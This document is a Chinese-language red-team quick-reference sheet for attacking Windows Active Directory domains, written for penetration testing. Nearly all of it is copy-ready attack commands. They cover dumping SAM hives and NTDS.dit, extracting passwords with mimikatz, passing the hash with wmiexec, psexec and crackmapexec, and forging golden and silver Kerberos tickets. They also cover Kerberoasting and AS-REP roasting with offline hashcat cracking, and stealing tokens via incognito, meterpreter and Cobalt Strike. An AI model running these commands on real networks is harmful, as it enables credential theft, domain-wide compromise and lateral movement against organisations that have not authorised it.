# Kerberos票据攻击与凭据获取 — 操作速查

> 适用：红队评估/渗透测试 — AD域凭据获取、票据伪造、横向认证

## §1 凭据获取

### SAM本地提取（无需上传工具）
```
reg save hklm\sam C:\sam.save
reg save hklm\system C:\system.save
reg save hklm\security C:\security.save
secretsdump.py -sam sam.save -system system.save -security security.save LOCAL
```

### mimikatz抓密码/Hash
```
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords full" "exit"
```

### NTDS.dit域控提取（拿到=拿到全域Hash）
```
ntdsutil "ac i ntds" ifm "create full c:\tmp" q q
NTDSDumpEx.exe -d ntds.dit -s system -o domain.txt
# 或远程：secretsdump.py domain/admin:pass@DC_IP
```

### QuarksPwDump
```
QuarksPwDump.exe -dhl          # 本地Hash
QuarksPwDump.exe -dhdc         # 域控Hash（需DC上执行）
```

## §2 PTH（哈希传递）

```
# mimikatz弹shell
mimikatz "privilege::debug" "sekurlsa::pth /user:administrator /domain:DOMAIN /ntlm:HASH"

# wmiexec远程执行（推荐，流量小）
wmiexec.py -hashes :NTLM_HASH domain/administrator@TARGET_IP

# psexec
psexec.py -hashes :NTLM_HASH domain/administrator@TARGET_IP

# crackmapexec批量
crackmapexec smb 10.10.10.0/24 -u administrator -H NTLM_HASH
```

## §3 Golden Ticket（黄金票据）

条件：krbtgt的NTLM Hash + 域SID + 域名

```
# 先获取krbtgt hash（需DC权限）
mimikatz "lsadump::dcsync /domain:DOMAIN /user:krbtgt"

# 伪造TGT
mimikatz "kerberos::golden /user:administrator /domain:DOMAIN.COM /sid:S-1-5-21-xxx /krbtgt:HASH /ptt"

# 验证
dir \\DC\c$
```

## §4 Silver Ticket（白银票据）

条件：目标服务账户NTLM Hash + 域SID + SPN（不经过KDC）

```
# CIFS访问文件共享
mimikatz "kerberos::golden /user:administrator /domain:DOMAIN.COM /sid:S-1-5-21-xxx /target:TARGET.DOMAIN.COM /service:cifs /rc4:SERVICE_HASH /ptt"

# LDAP访问目录服务（可DCSync）
mimikatz "kerberos::golden /user:administrator /domain:DOMAIN.COM /sid:S-1-5-21-xxx /target:DC.DOMAIN.COM /service:ldap /rc4:DC_HASH /ptt"
```
常用SPN：cifs（文件）、ldap（目录）、http（Web）、mssql（数据库）、host（计划任务/WMI）

## §5 Kerberoasting

```
# 查找SPN关联的用户账户
GetUserSPNs.py DOMAIN/user:pass -request -outputfile kerberoast.txt
# 或PowerView
Get-DomainUser -SPN | select samaccountname,serviceprincipalname

# 离线破解
hashcat -m 13100 kerberoast.txt wordlist.txt
john --format=krb5tgs kerberoast.txt --wordlist=wordlist.txt
```

## §6 AS-REP Roasting

```
# 查找不要求预认证的账户
GetNPUsers.py DOMAIN/ -usersfile users.txt -no-pass -outputfile asrep.txt
# 或PowerView
Get-DomainUser -PreauthNotRequired | select samaccountname

# 离线破解
hashcat -m 18200 asrep.txt wordlist.txt
```

## §7 令牌窃取

```
# incognito独立工具
incognito.exe list_tokens -u
incognito.exe execute -c "DOMAIN\Administrator" cmd.exe
incognito.exe execute -c "NT AUTHORITY\SYSTEM" cmd.exe

# Metasploit
meterpreter> use incognito
meterpreter> list_tokens -u
meterpreter> impersonate_token 'DOMAIN\\Administrator'

# CobaltStrike
beacon> steal_token PID
beacon> rev2self
```
